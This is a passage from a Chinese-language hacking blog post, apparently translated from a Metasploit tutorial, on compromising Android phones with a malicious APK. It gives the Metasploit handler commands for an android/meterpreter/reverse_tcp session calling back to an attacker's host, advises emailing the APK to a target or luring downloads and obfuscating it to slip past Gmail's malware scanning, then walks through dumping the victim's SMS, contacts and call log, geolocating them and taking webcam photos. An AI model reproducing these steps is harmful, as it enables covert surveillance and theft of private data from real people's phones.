  <pre class="graf graf--p">msf &gt;use exploit/multi/handler

msf &gt;set PAYLOAD android/meterpreter/reverse_tcp

msf &gt;set LHOST 192.168.1.101

msf &gt; set LPORT 6996

msf &gt; exploit</pre>
  <p class="graf graf--p">
   您必须确保 PAYLOAD、LPORT 和 LHOST 与您在 msfvenom 中创建.apk文件时使用的相同。
  </p>
  <h3 class="graf graf--p">
   <span style="color: #339966;">
    <strong class="markup--strong markup--p-strong">
     步骤5：将 HackersAriseMalwareApp.apk 交付给目标
    </strong>
   </span>
  </h3>
  <p class="graf graf--p">
   下一步，当然是将 .apk 文件传送到目标的移动设备上。如果您可以物理访问目标设备，只需安装 HackersAriseMalwareApp.apk。否则，您需要通过电子邮件或DropBox或其他方式将其发送给目标。
  </p>
  <p class="graf graf--p">
   需要注意的是，这个文件很可能会被Gmail和其他电子邮件服务标记为恶意软件。因此，考虑用
   <a class="markup--anchor markup--p-anchor" data-href="http://shell-storm.org/" href="http://shell-storm.org/" rel="noopener" target="_blank">
    OWASP-ZSC
   </a>
   或其他混淆软件（如 shellter 或 Veil-Evasion）重新编码有效载荷。
  </p>
  <p class="graf graf--p">
   此外，您甚至可能会考虑在自己的网站上托管.apk，并鼓励人们下载它。
  </p>
  <h3 class="graf graf--p">
   <span style="color: #339966;">
    <strong class="markup--strong markup--p-strong">
     步骤6：入侵目标系统
    </strong>
   </span>
  </h3>
  <p class="graf graf--p">
   一旦目标安装了.apk，您应该得到一个像下面这样的 meterpreter 提示。然后可以输入命令 sysinfo 来验证您是在Android设备上。
  </p>
  <pre class="graf graf--p">meterpreter &gt; sysinfo</pre>
  <figure class="graf graf--figure">
   <img class="graf-image aligncenter jetpack-lazy-image" data-height="308" data-image-id="1*2MIi2ogQXJd1-kSYT6sgtw.png" data-lazy-src="https://i0.wp.com/cdn-images-1.medium.com/max/1067/1*2MIi2ogQXJd1-kSYT6sgtw.png?w=1100&amp;is-pending-load=1#038;ssl=1" data-recalc-dims="1" data-width="1672" src="https://i0.wp.com/cdn-images-1.medium.com/max/1067/1*2MIi2ogQXJd1-kSYT6sgtw.png?w=1100&amp;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"/>
   <noscript>
    <img class="graf-image aligncenter" data-height="308" data-image-id="1*2MIi2ogQXJd1-kSYT6sgtw.png" data-recalc-dims="1" data-width="1672" src="https://i0.wp.com/cdn-images-1.medium.com/max/1067/1*2MIi2ogQXJd1-kSYT6sgtw.png?w=1100&amp;ssl=1"/>
   </noscript>
  </figure>
  <p class="graf graf--p">
   然后可以输入 help 以查看所有 Android meterpreter 命令：
  </p>
  <pre class="graf graf--p">meterpreter &gt; help</pre>
  <figure class="graf graf--figure">
   <img class="graf-image aligncenter jetpack-lazy-image" data-height="588" data-image-id="1*oBN5ZUuhPhjjuEpiicoZyg.png" data-lazy-src="https://i1.wp.com/cdn-images-1.medium.com/max/1067/1*oBN5ZUuhPhjjuEpiicoZyg.png?w=1100&amp;is-pending-load=1#038;ssl=1" data-recalc-dims="1" data-width="1672" src="https://i1.wp.com/cdn-images-1.medium.com/max/1067/1*oBN5ZUuhPhjjuEpiicoZyg.png?w=1100&amp;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"/>
   <noscript>
    <img class="graf-image aligncenter" data-height="588" data-image-id="1*oBN5ZUuhPhjjuEpiicoZyg.png" data-recalc-dims="1" data-width="1672" src="https://i1.wp.com/cdn-images-1.medium.com/max/1067/1*oBN5ZUuhPhjjuEpiicoZyg.png?w=1100&amp;ssl=1"/>
   </noscript>
  </figure>
  <p class="graf graf--p">
   请注意，在 Android Meterpreter 中提供了一些独特的选项，例如：
  </p>
  <pre class="graf graf--p">dump_calllog

dump_contacts

dump_sms

geolocacte

send_sms</pre>
  <p class="graf graf--p">
   这些命令使您能够看到目标在此设备上的任何行为，以及找到他们的位置。这个 meterpreter 还能够使用其他一些标准的命令，例如：
  </p>
  <pre class="graf graf--p">record_mic

webcam_snap

webcam_stream</pre>
  <h3 class="graf graf--p">
   <strong class="markup--strong markup--p-strong">
    <span style="color: #339966;">
     步骤7：从 Android 设备收集数据
    </span>
   </strong>
  </h3>
  <p class="graf graf--p">
   先从获取目标的文本消息开始：
  </p>
  <pre class="graf graf--p">meterpreter &gt; dump_sms</pre>
  <figure class="graf graf--figure">
   <img class="graf-image aligncenter jetpack-lazy-image" data-height="202" data-image-id="1*siSmEmEnXCXwEuvHb1TYQA.png" data-lazy-src="https://i0.wp.com/cdn-images-1.medium.com/max/1067/1*siSmEmEnXCXwEuvHb1TYQA.png?w=1100&amp;is-pending-load=1#038;ssl=1" data-recalc-dims="1" data-width="1236" src="https://i0.wp.com/cdn-images-1.medium.com/max/1067/1*siSmEmEnXCXwEuvHb1TYQA.png?w=1100&amp;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"/>
   <noscript>
    <img class="graf-image aligncenter" data-height="202" data-image-id="1*siSmEmEnXCXwEuvHb1TYQA.png" data-recalc-dims="1" data-width="1236" src="https://i0.wp.com/cdn-images-1.medium.com/max/1067/1*siSmEmEnXCXwEuvHb1TYQA.png?w=1100&amp;ssl=1"/>
   </noscript>
  </figure>
  <p class="graf graf--p">
   现在，获取目标人的联系人列表：
  </p>
  <pre class="graf graf--p">meterpreter &gt; dump_contacts</pre>
  <figure class="graf graf--figure">
   <img class="graf-image aligncenter jetpack-lazy-image" data-height="310" data-image-id="1*WY83WBwMq833gKhLC8gSHA.png" data-lazy-src="https://i2.wp.com/cdn-images-1.medium.com/max/1067/1*WY83WBwMq833gKhLC8gSHA.png?w=1100&amp;is-pending-load=1#038;ssl=1" data-recalc-dims="1" data-width="1670" src="https://i2.wp.com/cdn-images-1.medium.com/max/1067/1*WY83WBwMq833gKhLC8gSHA.png?w=1100&amp;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"/>
   <noscript>
    <img class="graf-image aligncenter" data-height="310" data-image-id="1*WY83WBwMq833gKhLC8gSHA.png" data-recalc-dims="1" data-width="1670" src="https://i2.wp.com/cdn-images-1.medium.com/max/1067/1*WY83WBwMq833gKhLC8gSHA.png?w=1100&amp;ssl=1"/>
   </noscript>
  </figure>
  <p class="graf graf--p">
   最后，尝试利用目标的网络摄像头，以便以后您可以从中捕捉照片：
  </p>
  <pre class="graf graf--p">meterpreter &gt; webcam_list</pre>
  <figure class="graf graf--figure">
   <img class="graf-image aligncenter jetpack-lazy-image" data-height="268" data-image-id="1*HwBMoVbLWwuHyHXa4vVukQ.png" data-lazy-src="https://i0.wp.com/cdn-images-1.medium.com/max/1067/1*HwBMoVbLWwuHyHXa4vVukQ.png?w=1100&amp;is-pending-load=1#038;ssl=1" data-recalc-dims="1" data-width="1130" src="https://i0.wp.com/cdn-images-1.medium.com/max/1067/1*HwBMoVbLWwuHyHXa4vVukQ.png?w=1100&amp;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"/>
   <noscript>
    <img class="graf-image aligncenter" data-height="268" data-image-id="1*HwBMoVbLWwuHyHXa4vVukQ.png" data-recalc-dims="1" data-width="1130" src="https://i0.wp.com/cdn-images-1.medium.com/max/1067/1*HwBMoVbLWwuHyHXa4vVukQ.png?w=1100&amp;ssl=1"/>
   </noscript>
  </figure>
  <p class="graf graf--p">
   现在您得到了设备上的网络摄像头列表，可以使用 meterpreter 命令 webcam_snap 和网络摄像头编号，以便（比如）从后置摄像头拍摄目标的照片：
  </p>
  <pre class="graf graf--p">meterpreter &gt; webcam_snap 1</pre>
  <h3 class="graf graf--p">
   <span style="color: #339966;">
    <strong class="markup--strong markup--p-strong">
     结论
    </strong>
   </span>
  </h3>
  <p class="graf graf--p">
   作为世界上使用最广泛的黑客/渗透测试平台，Metasploit 有能力入侵几乎所有的系统，当然包括Android移动设备。您可以创建一个恶意的.apk文件，当目标安装该应用程序时，您就可以几乎完全不受限制地访问他们的短信、联系人和网络摄像头。
  </p>
  <p class="graf graf--p">
   黑客行动主义完全为安全和正义而来，不允许任何恶意使用。⚪️
  </p>
  <p class="graf graf--p">
   <em>
    —— 未完待续 ——
   </em>
  </p>
  <p class="graf graf--p">
   <a class="markup--anchor markup--p-anchor" data-href="https://www.hackers-arise.com/post/2018/07/06/metasploit-basics-part-13-exploiting-android-mobile-devices" href="https://www.hackers-arise.com/post/2018/07/06/metasploit-basics-part-13-exploiting-android-mobile-devices" rel="noopener" target="_blank">
    Exploiting Android Mobile Devices
   </a>
  </p>
  <div id="atatags-1611829871-60d28f06867e8">
  </div>
  <div class="sharedaddy sd-sharing-enabled">
   <div class="robots-nocontent sd-block sd-social sd-social-icon sd-sharing">
    <h3 class="sd-title">
     共享此文章：
    </h3>
    <div class="sd-content">
     <ul>
      <li class="share-twitter">
       <a class="share-twitter sd-button share-icon no-text" data-shared="sharing-twitter-16313" href="https://www.iyouport.org/%e5%b0%9d%e8%af%95-metasploit%e5%85%a5%e4%be%b5android%e7%a7%bb%e5%8a%a8%e8%ae%be%e5%a4%87%ef%bc%9a%e9%bb%91%e5%ae%a2%e4%b8%bb%e4%b9%89%e8%a1%8c%e5%8a%a8%e5%8a%9b%ef%bc%8817%ef%bc%89/?share=twitter" rel="nofollow noopener noreferrer" target="_blank" title="点击分享到Twitter">
        <span>
        </span>
        <span class="sharing-screen-reader-text">
         点击分享到Twitter（在新窗口中打开）
        </span>
       </a>
      </li>
      <li class="share-facebook">
       <a class="share-facebook sd-button share-icon no-text" data-shared="sharing-facebook-16313" href="https://www.iyouport.org/%e5%b0%9d%e8%af%95-metasploit%e5%85%a5%e4%be%b5android%e7%a7%bb%e5%8a%a8%e8%ae%be%e5%a4%87%ef%bc%9a%e9%bb%91%e5%ae%a2%e4%b8%bb%e4%b9%89%e8%a1%8c%e5%8a%a8%e5%8a%9b%ef%bc%8817%ef%bc%89/?share=facebook" rel="nofollow noopener noreferrer" target="_blank" title="点击分享到 Facebook ">
        <span>
        </span>
        <span class="sharing-screen-reader-text">
         点击分享到 Facebook （在新窗口中打开）
        </span>
       </a>
      </li>
      <li class="share-end">
      </li>
     </ul>
    </div>
   </div>
  </div>
  <div class="sharedaddy sd-block sd-like jetpack-likes-widget-wrapper jetpack-likes-widget-unloaded" data-name="like-post-frame-161182987-16313-60d28f0686f43" data-src="https://widgets.wp.com/likes/#blog_id=161182987&amp;post_id=16313&amp;origin=www.iyouport.org&amp;obj_id=161182987-16313-60d28f0686f43" id="like-post-wrapper-161182987-16313-60d28f0686f43">
   <h3 class="sd-title">
    赞过：
   </h3>
   <div class="likes-widget-placeholder post-likes-widget-placeholder" style="height: 55px;">
    <span class="button">
     <span>
      赞
     </span>
    </span>
    <span class="loading">
     正在加载……
    </span>
   </div>
   <span class="sd-text-color">
   </span>
   <a class="sd-link-color">
   </a>
  </div>
  <div class="jp-relatedposts" id="jp-relatedposts">
   <h3 class="jp-relatedposts-headline">
    <em>
     相关
    </em>
   </h3>
  </div>
 </div>
 <div class="entry-footer">
  <ul class="post-tags light-text">
   <li>
    Tagged
   </li>
   <li>
    <a href="https://www.iyouport.org/tag/android/" rel="tag">
     Android
    </a>
   </li>
   <li>
    <a href="https://www.iyouport.org/tag/hacking/" rel="tag">
     hacking
    </a>
   </li>
   <li>
    <a href="https://www.iyouport.org/tag/hacktivist/" rel="tag">
     hacktivist
    </a>
   </li>
   <li>
    <a href="https://www.iyouport.org/tag/metasploit/" rel="tag">
     Metasploit
    </a>
   </li>
   <li>
    <a href="https://www.iyouport.org/tag/technology/" rel="tag">
     Technology
    </a>
   </li>
   <li>
    <a href="https://www.iyouport.org/tag/tools/" rel="tag">
     tools
    </a>
   </li>
  </ul>
 </div>
 <div class="entry-author-wrapper">
  <div class="site-posted-on">
   <strong>
    Published
   </strong>
   <time class="entry-date published" datetime="2021-06-23T00:04:14+08:00">
    2021年6月23日
   </time>
   <time class="updated" datetime="2021-03-23T16:26:14+08:00">
    2021年3月23日
   </time>
  </div>
 </div>
</article>

